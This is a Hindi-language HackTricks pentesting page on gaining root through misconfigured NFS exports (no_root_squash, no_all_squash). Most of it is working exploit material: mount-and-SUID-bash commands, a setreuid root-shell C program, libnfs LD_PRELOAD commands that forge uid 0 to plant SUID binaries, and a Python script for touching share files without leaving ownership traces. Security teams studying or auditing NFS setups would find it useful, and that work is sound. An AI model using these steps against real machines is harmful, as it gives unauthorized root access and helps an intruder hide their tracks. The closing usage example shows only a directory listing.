{{#include ../../banners/hacktricks-training.md}}

_ **/etc/exports** _ फ़ाइल को पढ़ें, यदि आप कुछ निर्देशिका पाते हैं जो **no_root_squash** के रूप में कॉन्फ़िगर की गई है, तो आप **क्लाइंट के रूप में** इसे **एक्सेस** कर सकते हैं और उस निर्देशिका के अंदर **लिख सकते हैं** **जैसे** कि आप मशीन के स्थानीय **रूट** थे।

**no_root_squash**: यह विकल्प मूल रूप से क्लाइंट पर रूट उपयोगकर्ता को NFS सर्वर पर रूट के रूप में फ़ाइलों तक पहुँचने का अधिकार देता है। और इससे गंभीर सुरक्षा परिणाम हो सकते हैं।

**no_all_squash:** यह **no_root_squash** विकल्प के समान है लेकिन **गैर-रूट उपयोगकर्ताओं** पर लागू होता है। कल्पना करें, आपके पास कोई उपयोगकर्ता के रूप में एक शेल है; /etc/exports फ़ाइल की जांच की; no_all_squash विकल्प मौजूद है; /etc/passwd फ़ाइल की जांच करें; एक गैर-रूट उपयोगकर्ता का अनुकरण करें; उस उपयोगकर्ता के रूप में एक suid फ़ाइल बनाएं (nfs का उपयोग करके माउंट करके)। कोई उपयोगकर्ता के रूप में suid को निष्पादित करें और विभिन्न उपयोगकर्ता बनें।

# Privilege Escalation

## Remote Exploit

यदि आपने इस भेद्यता को पाया है, तो आप इसका शोषण कर सकते हैं:

- **क्लाइंट मशीन में उस निर्देशिका को माउंट करना**, और **रूट के रूप में** माउंट किए गए फ़ोल्डर के अंदर **/bin/bash** बाइनरी को कॉपी करना और उसे **SUID** अधिकार देना, और **पीड़ित** मशीन से उस बाश बाइनरी को निष्पादित करना।
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
- **क्लाइंट मशीन में उस निर्देशिका को माउंट करना**, और **रूट के रूप में** माउंट की गई फ़ोल्डर के अंदर हमारे संकलित पेलोड को कॉपी करना जो SUID अनुमति का दुरुपयोग करेगा, इसे **SUID** अधिकार देना, और **शिकार** मशीन से उस बाइनरी को **निष्पादित करना** (आप यहाँ कुछ [C SUID पेलोड्स](payloads-to-execute.md#c) पा सकते हैं)।
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> ध्यान दें कि यदि आप अपने मशीन से पीड़ित मशीन तक **एक टनल बना सकते हैं तो आप इस विशेषाधिकार वृद्धि का शोषण करने के लिए रिमोट संस्करण का उपयोग कर सकते हैं**।\
> निम्नलिखित ट्रिक उस स्थिति में है जब फ़ाइल `/etc/exports` **एक IP को इंगित करती है**। इस मामले में आप **किसी भी स्थिति में** **रिमोट शोषण** का उपयोग नहीं कर पाएंगे और आपको **इस ट्रिक का दुरुपयोग करना होगा**।\
> शोषण के काम करने के लिए एक और आवश्यक शर्त यह है कि **`/etc/export` के अंदर का निर्यात** **`insecure` फ्लैग का उपयोग कर रहा होना चाहिए**।\
> --_मुझे यकीन नहीं है कि यदि `/etc/export` एक IP पते को इंगित कर रहा है तो यह ट्रिक काम करेगी_--

## Basic Information

परिदृश्य में एक स्थानीय मशीन पर एक माउंटेड NFS शेयर का शोषण करना शामिल है, NFSv3 विनिर्देशन में एक दोष का लाभ उठाते हुए जो क्लाइंट को अपने uid/gid को निर्दिष्ट करने की अनुमति देता है, संभावित रूप से अनधिकृत पहुंच सक्षम करता है। शोषण में [libnfs](https://github.com/sahlberg/libnfs) का उपयोग शामिल है, जो NFS RPC कॉल के forging की अनुमति देने वाली एक लाइब्रेरी है।

### Compiling the Library

लाइब्रेरी संकलन चरणों में कर्नेल संस्करण के आधार पर समायोजन की आवश्यकता हो सकती है। इस विशेष मामले में, fallocate syscalls को टिप्पणी की गई थी। संकलन प्रक्रिया में निम्नलिखित कमांड शामिल हैं:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### एक्सप्लॉइट करना

एक्सप्लॉइट में एक सरल C प्रोग्राम (`pwn.c`) बनाना शामिल है जो रूट के लिए विशेषाधिकार बढ़ाता है और फिर एक शेल निष्पादित करता है। प्रोग्राम को संकलित किया जाता है, और परिणामी बाइनरी (`a.out`) को suid रूट के साथ शेयर पर रखा जाता है, RPC कॉल में uid को फेक करने के लिए `ld_nfs.so` का उपयोग किया जाता है:

1. **एक्सप्लॉइट कोड संकलित करें:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **शेयर पर एक्सप्लॉइट रखें और uid को फेक करके इसकी अनुमतियों को संशोधित करें:**

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **रूट विशेषाधिकार प्राप्त करने के लिए एक्सप्लॉइट निष्पादित करें:**
```bash
/mnt/share/a.out
#root
```

## बोनस: NFShell के लिए छिपे हुए फ़ाइल एक्सेस

एक बार रूट एक्सेस प्राप्त होने के बाद, स्वामित्व को बदले बिना NFS शेयर के साथ इंटरैक्ट करने के लिए (निशान छोड़ने से बचने के लिए), एक Python स्क्रिप्ट (nfsh.py) का उपयोग किया जाता है। यह स्क्रिप्ट uid को उस फ़ाइल के uid से मेल खाने के लिए समायोजित करती है जिसे एक्सेस किया जा रहा है, जिससे शेयर पर फ़ाइलों के साथ बिना अनुमति की समस्याओं के इंटरैक्शन की अनुमति मिलती है:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
जैसे चलाएँ:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
